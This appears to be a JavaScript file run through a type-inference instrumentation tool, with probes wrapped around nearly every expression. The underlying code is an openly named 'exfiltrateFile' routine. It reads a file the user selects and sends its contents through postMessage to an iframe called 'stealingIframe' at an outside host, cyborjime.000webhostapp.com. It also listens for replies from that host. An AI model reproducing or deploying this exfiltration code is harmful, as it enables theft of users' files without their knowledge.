var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
var Inst36 = 0;
var Inst37 = 0;
var Inst38 = 0;
var Inst39 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}

try { if (Inst0 <= 1000 && typeof (exfiltrateFile) != "undefined") {_RecordType("<25,39,2>",(exfiltrateFile)); Inst0++; } } catch(e) {}
        async function exfiltrateFile() {
try { if (Inst2 <= 1000 && typeof (document.getElementById) != "undefined") {_RecordType("<75,98,3>",(document.getElementById)); Inst2++; } } catch(e) {}try { if (Inst3 <= 1000 && typeof (document) != "undefined") {_RecordType("<75,83,3>",(document)); Inst3++; } } catch(e) {}
            const fileInput = document.getElementById('fileInput');
try { if (Inst1 <= 1000 && typeof (fileInput) != "undefined") {_RecordType("<63,72,3>",(fileInput)); Inst1++; } } catch(e) {}
try { if (Inst4 <= 1000 && typeof (fileInput.files.length) != "undefined") {_RecordType("<130,152,4>",(fileInput.files.length)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (fileInput.files) != "undefined") {_RecordType("<130,145,4>",(fileInput.files)); Inst5++; } } catch(e) {}try { if (Inst6 <= 1000 && typeof (fileInput) != "undefined") {_RecordType("<130,139,4>",(fileInput)); Inst6++; } } catch(e) {}
            if (fileInput.files.length === 0) {
try { if (Inst7 <= 1000 && typeof (alert) != "undefined") {_RecordType("<179,184,5>",(alert)); Inst7++; } } catch(e) {}
                alert('Please select a file first.');
                return;
            }

try { if (Inst9 <= 1000 && typeof (fileInput.files[0]) != "undefined") {_RecordType("<285,303,9>",(fileInput.files[0])); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (fileInput.files) != "undefined") {_RecordType("<285,300,9>",(fileInput.files)); Inst10++; } } catch(e) {}try { if (Inst11 <= 1000 && typeof (fileInput) != "undefined") {_RecordType("<285,294,9>",(fileInput)); Inst11++; } } catch(e) {}
            const file = fileInput.files[0];
try { if (Inst8 <= 1000 && typeof (file) != "undefined") {_RecordType("<278,282,9>",(file)); Inst8++; } } catch(e) {}
try { if (Inst13 <= 1000 && typeof (FileReader) != "undefined") {_RecordType("<337,347,10>",(FileReader)); Inst13++; } } catch(e) {}
            const reader = new FileReader();
try { if (Inst12 <= 1000 && typeof (reader) != "undefined") {_RecordType("<324,330,10>",(reader)); Inst12++; } } catch(e) {}

            reader.onload = async function(event) {
try { if (Inst16 <= 1000 && typeof (event) != "undefined") {_RecordType("<397,402,12>",(event)); Inst16++; } } catch(e) {}
try { if (Inst18 <= 1000 && typeof (event.target.result) != "undefined") {_RecordType("<443,462,13>",(event.target.result)); Inst18++; } } catch(e) {}try { if (Inst19 <= 1000 && typeof (event.target) != "undefined") {_RecordType("<443,455,13>",(event.target)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (event) != "undefined") {_RecordType("<443,448,13>",(event)); Inst20++; } } catch(e) {}
                const fileContent = event.target.result;
try { if (Inst17 <= 1000 && typeof (fileContent) != "undefined") {_RecordType("<429,440,13>",(fileContent)); Inst17++; } } catch(e) {}

                // Send file content to iframe
try { if (Inst22 <= 1000 && typeof (document.getElementById) != "undefined") {_RecordType("<546,569,16>",(document.getElementById)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (document) != "undefined") {_RecordType("<546,554,16>",(document)); Inst23++; } } catch(e) {}
                const iframe = document.getElementById('stealingIframe');
try { if (Inst21 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<537,543,16>",(iframe)); Inst21++; } } catch(e) {}
try { if (Inst24 <= 1000 && typeof (iframe.contentWindow.postMessage) != "undefined") {_RecordType("<606,638,17>",(iframe.contentWindow.postMessage)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (iframe.contentWindow) != "undefined") {_RecordType("<606,626,17>",(iframe.contentWindow)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<606,612,17>",(iframe)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (fileContent) != "undefined") {_RecordType("<671,682,17>",(fileContent)); Inst27++; } } catch(e) {}
                iframe.contentWindow.postMessage({ type: 'fileContent', content: fileContent }, 'https://cyborjime.000webhostapp.com');
            };
try { if (Inst14 <= 1000 && typeof (reader.onload) != "undefined") {_RecordType("<366,379,12>",(reader.onload)); Inst14++; } } catch(e) {}try { if (Inst15 <= 1000 && typeof (reader) != "undefined") {_RecordType("<366,372,12>",(reader)); Inst15++; } } catch(e) {}

try { if (Inst28 <= 1000 && typeof (reader.readAsText) != "undefined") {_RecordType("<757,774,20>",(reader.readAsText)); Inst28++; } } catch(e) {}try { if (Inst29 <= 1000 && typeof (reader) != "undefined") {_RecordType("<757,763,20>",(reader)); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (file) != "undefined") {_RecordType("<775,779,20>",(file)); Inst30++; } } catch(e) {}
            reader.readAsText(file);
        }

try { if (Inst31 <= 1000 && typeof (window.addEventListener) != "undefined") {_RecordType("<804,827,23>",(window.addEventListener)); Inst31++; } } catch(e) {}try { if (Inst32 <= 1000 && typeof (window) != "undefined") {_RecordType("<804,810,23>",(window)); Inst32++; } } catch(e) {}try { if (Inst33 <= 1000 && typeof (event) != "undefined") {_RecordType("<840,845,23>",(event)); Inst33++; } } catch(e) {}
        window.addEventListener('message', (event) => {
try { if (Inst34 <= 1000 && typeof (event.origin) != "undefined") {_RecordType("<869,881,24>",(event.origin)); Inst34++; } } catch(e) {}try { if (Inst35 <= 1000 && typeof (event) != "undefined") {_RecordType("<869,874,24>",(event)); Inst35++; } } catch(e) {}
            if (event.origin !== 'https://cyborjime.000webhostapp.com') return;
try { if (Inst36 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<946,957,25>",(console.log)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (console) != "undefined") {_RecordType("<946,953,25>",(console)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (event.data) != "undefined") {_RecordType("<991,1001,25>",(event.data)); Inst38++; } } catch(e) {}try { if (Inst39 <= 1000 && typeof (event) != "undefined") {_RecordType("<991,996,25>",(event)); Inst39++; } } catch(e) {}
            console.log('Received message from iframe:', event.data);
        });
    
